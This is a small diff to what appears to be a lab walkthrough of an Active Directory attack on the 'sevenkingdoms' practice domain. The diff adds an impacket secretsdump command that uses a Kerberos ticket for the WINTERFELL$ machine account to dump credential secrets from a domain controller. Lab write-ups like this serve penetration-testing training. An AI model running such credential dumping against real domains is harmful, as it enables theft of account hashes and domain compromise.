@@ -84,7 +84,9 @@ We are prompted with the `jon.snow` password and successfully get the ST for the
 ![[images/2026-10-08_17-05-39.png]]
 Now let's try to dump the secrets !
 
-
+```bash
+impacket-secretdump    north.sevenkingdoms.local/WINTERFELL$@winterfell.north.sevenkingdoms.local -k -no-pass
+```
 
 
 
